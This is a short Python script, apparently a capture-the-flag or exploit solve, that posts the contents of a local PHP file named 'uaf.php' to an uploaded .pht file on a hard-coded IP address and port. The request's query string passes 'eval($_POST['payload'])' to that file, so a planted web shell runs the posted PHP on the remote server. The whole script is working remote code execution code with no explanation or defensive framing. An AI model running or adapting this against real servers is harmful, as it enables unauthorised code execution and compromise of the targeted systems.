import requests

data = {
    'payload': open('uaf.php').read().replace('<?php', '')
}

response = requests.post("http://3.38.109.135:28344/data/bf233c59229bbbbe50aa44971fbb17c2/40977f3b892bcbc3edd5fd4f1d3abe38.pht?code=eval($_POST['payload']);", data=data)
print(response.text)
